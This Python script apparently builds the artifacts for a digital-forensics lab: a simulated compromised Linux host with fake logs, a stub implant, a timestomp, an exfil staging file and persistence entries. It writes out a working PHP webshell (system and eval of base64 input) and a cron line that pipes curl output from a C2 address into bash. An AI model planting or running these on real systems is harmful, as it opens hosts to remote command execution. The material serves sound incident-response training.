#!/usr/bin/env python3
# Lab 11.2 - dung mot "he thong" Linux gia lap da bi nhiem, tu chua, gon:
#   log (nginx access, auth, syslog) + file kha nghi (webshell, implant) +
#   persistence (cron, systemd) + staging exfil + dau anti-forensic (timestomp).
# Kich ban mo phong, khong dung du lieu that. IOC deu la gia tri vi du.
#
# Dung: python3 -I make_artifacts.py [thu_muc_dich]   (mac dinh ./case-host)

import os
import sys
import struct
import time

C2_IP = "185.234.72.19"
ATTACKER_IP = "198.51.100.23"

def w(path, content, mode=0o644):
    os.makedirs(os.path.dirname(path), exist_ok=True)
    data = content.encode() if isinstance(content, str) else content
    with open(path, "wb") as f:
        f.write(data)
    os.chmod(path, mode)

def nginx_log():
    L = []
    def g(ip, ts, req, code, size, ua):
        L.append(f'{ip} - - [{ts} +0000] "{req}" {code} {size} "-" "{ua}"')
    g("203.0.113.9", "07/Jan/2026:08:40:11", "GET / HTTP/1.1", 200, 5120, "Mozilla/5.0")
    g("203.0.113.9", "07/Jan/2026:08:41:03", "GET /about HTTP/1.1", 200, 2048, "Mozilla/5.0")
    # initial access: upload webshell roi khai thac
    g(ATTACKER_IP, "07/Jan/2026:09:01:12", "POST /upload.php HTTP/1.1", 200, 512, "python-requests/2.31")
    g(ATTACKER_IP, "07/Jan/2026:09:01:40", "GET /uploads/shell.php?cmd=id HTTP/1.1", 200, 44, "curl/8.0")
    g(ATTACKER_IP, "07/Jan/2026:09:02:05",
      f"GET /uploads/shell.php?cmd=wget+http://{C2_IP}/x+-O+/var/tmp/.sysd/kworkerd HTTP/1.1", 200, 20, "curl/8.0")
    g(ATTACKER_IP, "07/Jan/2026:09:02:30", "GET /uploads/shell.php?cmd=chmod+755+/var/tmp/.sysd/kworkerd HTTP/1.1", 200, 0, "curl/8.0")
    return "\n".join(L) + "\n"

def auth_log():
    return (
        "Jan  7 09:03:11 web01 systemd[1]: Started network-helper.service.\n"
        "Jan  7 09:05:22 web01 sudo:  www-data : TTY=unknown ; PWD=/var/www/html ; USER=root ; COMMAND=/usr/bin/id\n"
        "Jan  7 10:15:00 web01 rsyslogd: [origin ...] rsyslogd was HUPed\n"
    )

def syslog_log():
    return (
        f"Jan  7 09:03:30 web01 kworkerd[3120]: connect {C2_IP}:8443\n"
        "Jan  7 10:14:59 web01 systemd[1]: Stopping System Logging Service...\n"
        "Jan  7 10:15:00 web01 systemd[1]: Starting System Logging Service...\n"
    )

def build_implant():
    # ELF header toi thieu de `file` nhan ra, kem cac chuoi IOC cho `strings`
    e_ident = b"\x7fELF" + bytes([2, 1, 1, 0]) + b"\x00" * 8
    hdr = e_ident + struct.pack("<HHIQQQIHHHHHH",
        2, 0x3e, 1, 0x400000, 64, 0, 0, 64, 56, 1, 0, 0, 0)
    strings = b"\x00".join([
        b"",
        f"https://{C2_IP}:8443/gate.php".encode(),
        C2_IP.encode(),
        b"Mozilla/5.0 (X11; Linux x86_64) AcctLoader/1.2",
        b"Global\\AcctLdr_7f3a",
        b"/builds/acctldr/loader.c",
        b"X-Session: 7f3a2b1c",
        b"/var/tmp/.sysd/data.tar.gz",
        b"beacon_interval=60",
        b"",
    ])
    return hdr + b"\x00" * 64 + strings

def main():
    root = os.path.abspath(sys.argv[1] if len(sys.argv) > 1 else "case-host")
    if os.path.exists(root):
        import shutil
        shutil.rmtree(root)

    # logs
    w(os.path.join(root, "var/log/nginx/access.log"), nginx_log())
    w(os.path.join(root, "var/log/auth.log"), auth_log())
    w(os.path.join(root, "var/log/syslog"), syslog_log())

    # webshell (initial access)
    w(os.path.join(root, "var/www/html/uploads/shell.php"),
      "<?php // webshell don gian\nif(isset($_GET['cmd'])){system($_GET['cmd']);}\n"
      "@eval(base64_decode($_POST['x']));\n?>\n")

    # implant (file kha nghi)
    implant = os.path.join(root, "var/tmp/.sysd/kworkerd")
    w(implant, build_implant(), mode=0o755)
    # anti-forensic: timestomp mtime ve 2009 (ctime khong gia duoc)
    old = time.mktime((2009, 6, 1, 3, 0, 0, 0, 0, 0))
    os.utime(implant, (old, old))

    # staging exfil
    w(os.path.join(root, "var/tmp/.sysd/data.tar.gz"), os.urandom(4096))

    # persistence: cron drop-in + systemd service
    w(os.path.join(root, "etc/cron.d/nginx-cache"),
      f"*/10 * * * * root curl -fsSL http://{C2_IP}/pull | bash >/dev/null 2>&1\n")
    w(os.path.join(root, "etc/systemd/system/network-helper.service"),
      "[Unit]\nDescription=Network helper\n\n[Service]\n"
      f"ExecStart=/var/tmp/.sysd/kworkerd --c2 {C2_IP}:8443\nRestart=always\n\n"
      "[Install]\nWantedBy=multi-user.target\n")

    print(f"[+] Da dung he thong gia lap da bi nhiem tai: {root}")
    print(f"[+] IOC cai san: C2 {C2_IP}, attacker {ATTACKER_IP}, webshell, implant kworkerd (timestomp 2009)")
    print("[+] Chay tiep:  python3 -I solve.py " + (sys.argv[1] if len(sys.argv) > 1 else "case-host"))

if __name__ == "__main__":
    main()
